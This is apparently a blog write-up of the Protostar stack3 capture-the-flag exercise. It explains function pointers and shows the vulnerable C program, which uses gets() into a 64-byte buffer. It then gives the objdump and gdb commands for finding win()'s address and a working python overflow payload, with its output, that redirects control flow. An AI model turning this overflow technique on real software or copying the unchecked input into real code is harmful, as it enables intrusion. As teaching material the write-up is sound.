---
title: Protostar Writeup - stack3
updated: 2018-07-28 23:45
---

## Protostar - stack3

Moving on to the next challenge. Things get pretty interesting over here. Our task is to somehow call the `win()` method. Again as you can see this is actually a buffer overflow attack.
Here's the code, let's take a closer look at it.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
    printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
    volatile int (*fp)();
    char buffer[64];

    fp = 0;

    gets(buffer);

    if(fp) {
        printf("calling function pointer, jumping to 0x%08x\n", fp);
        fp();
    }
}
```

We're dealing with function pointers in this case, which we get to know from `int (*fp)()`.
A pointer is a special kind of variable which 'points' to a particular memory location. If we have to access the contents at that location we 'dereference' it using the `*` operator.
So you can think of it in this way, if I declare a pointer `int *a`. This tells me that `a` will give me the memory location and `*a` will actually give me the contents of that memory location.
A function pointer is the same, it isn't a true function in it's true sense. The function pointer just points to executable code, where as a normal pointer points to certain data.
Now that we know that a pointer 'points' to a certain location, we can exploit this.

### The solution

This solution to this challenge is pretty simple once you understand how function pointers work. We somehow have to change the value of `fp` and make it point to the location of the `win()` method.
Now the question arises... how the heck do I get the address of the `win()` method? If we take a look at the hints on the site we see two ways. One is gdb and the other objdump. I'll demonstrate both the ways.

First let's take a look at the address of `win()` using objdump.

```shell
$ objdump -d stack3 | grep win
08048424 <win>:
```

We get the address of the `win()` method which is `0x08048424`. Now let's do the same, but this time using gdb.

```shell
$ gdb stack3
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
```
This is how you get the address of the function using gdb.

Now that we have our address, let's exploit the binary. Since we know the `buffer` variable is of 64 bytes, we add that much padding.
Also, keep in mind that we're working on a little endian architecture so we write the address accordingly.

```shell
$ python -c "print 'A'*64 + '\x24\x84\x04\x08'" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

Pwned! Nice and simple, considering that we learn't a thing or two about function pointers, this challenge wasn't that boring.

### Sites

[Protostar](https://exploit-exercises.com/protostar/)
[Phrack](http://phrack.org/issues/49/14.html)
[Function Pointers](https://en.wikipedia.org/wiki/Function_pointer)
